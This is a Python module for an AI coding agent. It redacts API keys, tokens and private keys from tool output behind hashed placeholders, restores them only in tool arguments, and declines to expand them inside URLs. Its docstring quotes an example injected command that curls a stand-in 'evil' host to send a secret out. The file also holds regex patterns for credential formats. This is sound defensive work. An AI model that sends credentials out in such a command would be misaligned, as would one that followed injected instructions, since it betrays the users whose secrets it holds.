"""Secret redaction — keep credentials OUT of every cloud provider's context window.

Collie's explore tools routinely read .env files and grep for keys (that IS the task sometimes);
with third-party providers (Gemini/OpenAI/DeepSeek/…) those tool outputs would ship raw
credentials to the vendor. This module makes that leak structurally impossible WITHOUT
breaking key-using workflows:

  - redact(text, vault)  : tool OUTPUT -> secrets replaced by stable ``{{SECRET:<sha8>}}``
                           placeholders; the real value is kept in the run-local vault
                           (in-memory only — never written to disk or the session log).
  - restore(obj, vault)  : tool INPUT  -> placeholders substituted back to real values right
                           before execution, so the model can *use* a secret it has never seen
                           (deploy configs, curl -H "Authorization: …", etc.).

The placeholder is deterministic (sha256 of the value), so the same secret redacts to the
same token across reads and runs; re-reading the file within a run repopulates the vault.
Patterns are conservative vendor-prefix / structural matches to keep false positives rare.
"""
from __future__ import annotations

import hashlib
import re

# vendor-prefixed / structural credential shapes. Ordered: PEM first (multiline, would
# otherwise be shredded by the generic rule), then unambiguous prefixes, then generic
# key=value assignments last (its match group is the VALUE only).
_PATTERNS: list[tuple[str, re.Pattern]] = [
    ("pem",     re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----")),
    ("anthropic", re.compile(r"\bsk-ant-[A-Za-z0-9_-]{20,}")),
    ("stripe",  re.compile(r"\b[rs]k_(?:live|test)_[A-Za-z0-9]{16,}")),
    ("openai",  re.compile(r"\bsk-[A-Za-z0-9_-]{20,}")),
    ("groq",    re.compile(r"\bgsk_[A-Za-z0-9]{20,}")),
    ("xai",     re.compile(r"\bxai-[A-Za-z0-9-]{20,}")),
    ("boson",   re.compile(r"\bbai-[A-Za-z0-9]{20,}")),
    ("google",  re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("goauth",  re.compile(r"\bya29\.[0-9A-Za-z_-]{20,}")),
    ("github",  re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{20,}|\bgithub_pat_[A-Za-z0-9_]{20,}")),
    ("slack",   re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}")),
    ("aws",     re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("jwt",     re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}")),
    # generic `api_key=…` / `TOKEN: "…"` assignments; value charset excludes ( ) so code like
    # `token = get_token()` never matches, and requires 16+ chars so short flags survive.
    # NOTE: no leading \b — the keyword is commonly prefixed by an underscore in env-var form
    # (GROQ_API_KEY=, DATABASE_PASSWORD=), where a \b would fail to match and leak the value.
    ("assign",  re.compile(r"(?i)(?:api[_-]?key|apikey|access[_-]?token|auth[_-]?token|secret[_-]?key|client[_-]?secret|password|passwd)\b\s*[=:]\s*['\"]?([A-Za-z0-9_\-./+]{16,})['\"]?")),
]

_PLACEHOLDER = "{{SECRET:%s}}"
_PLACE_RE = re.compile(r"\{\{SECRET:([0-9a-f]{8})\}\}")


def _tag(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()[:8]


def redact(text: str, vault: dict) -> str:
    """Replace secret material in `text` with placeholders; remember values in `vault`."""
    if not isinstance(text, str) or len(text) < 16:
        return text
    # A restored placeholder can return through execute_code RPC (or another tool output) as a
    # bare opaque value that no vendor-shaped regex recognizes. Values already admitted to the
    # run-local vault are secrets by construction, so replace them longest-first before discovery.
    for tag, value in sorted(list((vault or {}).items()),
                             key=lambda item: len(str(item[1] or "")), reverse=True):
        value = str(value or "")
        if value:
            text = text.replace(value, _PLACEHOLDER % tag)
    for kind, pat in _PATTERNS:
        def _sub(m, kind=kind):
            val = m.group(1) if m.groups() else m.group(0)
            if _PLACE_RE.fullmatch(val):          # already a placeholder — don't double-wrap
                return m.group(0)
            tag = _tag(val)
            vault[tag] = val
            return m.group(0).replace(val, _PLACEHOLDER % tag)
        text = pat.sub(_sub, text)
    return text


def redact_obj(obj, vault: dict):
    """Recursively redact string keys and values before policy/audit sees them."""
    if isinstance(obj, str):
        return redact(obj, vault)
    if isinstance(obj, dict):
        return {(redact(k, vault) if isinstance(k, str) else k): redact_obj(v, vault)
                for k, v in obj.items()}
    if isinstance(obj, list):
        return [redact_obj(v, vault) for v in obj]
    if isinstance(obj, tuple):
        return tuple(redact_obj(v, vault) for v in obj)
    return obj


def restore(obj, vault: dict):
    """Recursively substitute placeholders back to real values in tool args (str/dict/list).

    A placeholder that sits INSIDE a URL token is left un-expanded: that is the exfiltration
    shape (e.g. `curl https://evil/?k={{SECRET:…}}` injected via untrusted content). Legitimate
    header usage (`-H "Authorization: {{SECRET:…}}"`) is unaffected — the placeholder there is its
    own whitespace-delimited token, not part of a scheme://… run.
    """
    if isinstance(obj, str):
        def _sub(m):
            start = obj.rfind(" ", 0, m.start())
            q = max(obj.rfind('"', 0, m.start()), obj.rfind("'", 0, m.start()))
            tok = obj[max(start, q) + 1:m.end()].lower()
            if "http://" in tok or "https://" in tok:
                return m.group(0)                 # do not expand a secret into an outbound URL
            return vault.get(m.group(1), m.group(0))
        return _PLACE_RE.sub(_sub, obj)
    if isinstance(obj, dict):
        return {(restore(k, vault) if isinstance(k, str) else k): restore(v, vault)
                for k, v in obj.items()}
    if isinstance(obj, list):
        return [restore(v, vault) for v in obj]
    return obj
